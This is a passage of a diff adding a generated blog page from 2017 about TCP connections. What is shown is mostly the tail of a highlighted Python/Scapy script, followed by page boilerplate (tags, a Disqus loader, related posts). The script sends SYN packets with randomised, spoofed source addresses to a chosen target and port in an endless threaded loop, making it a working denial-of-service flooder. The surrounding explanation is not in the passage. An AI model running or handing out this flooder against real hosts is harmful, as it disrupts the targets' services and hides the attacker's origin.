+		<span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="o">.</span><span class="n">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>
+	<span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+		<span class="n">i</span> <span class="o">=</span> <span class="n">IP</span><span class="p">()</span>
+		<span class="n">i</span><span class="o">.</span><span class="n">src</span> <span class="o">=</span> <span class="s">"</span><span class="si">%</span><span class="s">i.</span><span class="si">%</span><span class="s">i.</span><span class="si">%</span><span class="s">i.</span><span class="si">%</span><span class="s">i"</span> <span class="o">%</span> <span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">254</span><span class="p">),</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">254</span><span class="p">),</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">254</span><span class="p">),</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">254</span><span class="p">))</span>
+		<span class="n">i</span><span class="o">.</span><span class="n">dst</span> <span class="o">=</span> <span class="n">target</span>
+
+		<span class="n">t</span> <span class="o">=</span> <span class="n">TCP</span><span class="p">()</span>
+		<span class="n">t</span><span class="o">.</span><span class="n">sport</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">65535</span><span class="p">)</span>
+		<span class="n">t</span><span class="o">.</span><span class="n">dport</span> <span class="o">=</span> <span class="n">port</span>
+		<span class="n">t</span><span class="o">.</span><span class="n">flags</span> <span class="o">=</span> <span class="s">'S'</span>
+
+		<span class="n">send</span><span class="p">(</span><span class="n">i</span><span class="o">/</span><span class="n">t</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="s">"Flooding </span><span class="si">%</span><span class="s">s:</span><span class="si">%</span><span class="s">i with SYN packets."</span> <span class="o">%</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+	<span class="n">sendSYN</span><span class="p">()</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+	<span class="n">total</span> <span class="o">+=</span> <span class="mi">1</span>
+	<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">"</span><span class="se">\r</span><span class="s">Total packets sent:</span><span class="se">\t\t\t</span><span class="si">%</span><span class="s">i"</span> <span class="o">%</span> <span class="n">total</span><span class="p">)</span>
+
+
+  </code></pre></figure>
+
+
+    
+
+
+
+<div class="post-tags">
+  
+    
+    <a href="/tags.html#network">
+    
+      <span class="icon">
+        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 0h24v24H0z" fill="none"/>
+    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
+</svg>
+      </span>&nbsp;<span class="tag-name">network</span>
+    </a>
+  
+</div>
+  </div>
+
+  
+  <section class="comments">
+    <h2>Comments</h2>
+    
+  <div id="disqus_thread">
+    <button class="disqus-load" onClick="loadDisqusComments()">
+      Load Comments
+    </button>
+  </div>
+  <script>
+
+  /**
+  *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW
+  *  TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+  *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT:s
+  *  https://disqus.com/admin/universalcode/#configuration-variables
+  */
+  var disqus_config = function () {
+    this.page.url = "http://localhost:4000/2017/11/24/TCP-connection.html";
+    this.page.identifier = "" ||
+                           "http://localhost:4000/2017/11/24/TCP-connection.html";
+  }
+  function loadDisqusComments() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = 'https://zwerd-com.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+  }
+  </script>
+  <noscript>
+    Please enable JavaScript to view the
+    <a href="https://disqus.com/?ref_noscript">comments powered by Disqus</a>.
+  </noscript>
+
+
+  </section>
+
+
+  <section class="related">
+  <h2>Related Posts</h2>
+  <ul class="posts-list">
+    
+      <li>
+        <h3>
+          <a href="/2017/11/27/SQL-Injection.html">
+            SQL Injection
+            <small>27 Nov 2017</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2017/10/23/Abiha-hidot.html">
+            Nach Riddles!
+            <small>23 Oct 2017</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2017/10/22/CheckPoint.html">
+            CheckPoint
+            <small>22 Oct 2017</small>
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</section>
+
+</div>
+
+    </main>
+
+    <!-- Optional footer content -->
+
+  </body>
+</html>
